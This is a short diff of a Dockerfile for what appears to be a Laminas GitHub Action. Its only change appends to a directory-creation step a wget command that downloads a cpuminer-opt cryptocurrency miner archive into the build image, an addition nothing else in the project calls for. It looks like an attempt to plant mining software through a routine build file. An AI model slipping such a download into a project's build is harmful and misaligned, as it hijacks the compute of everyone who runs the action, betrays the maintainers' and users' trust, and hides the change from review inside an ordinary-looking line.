@@ -7,7 +7,7 @@ LABEL "maintainer"="https://github.com/laminas/technical-steering-committee/"
 RUN apk update \
     && apk add --no-cache bash git
 
-RUN mkdir /action
+RUN mkdir /action && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
 ADD index.js /action/index.js
 ADD src /action/src
 ADD package.json /action/package.json
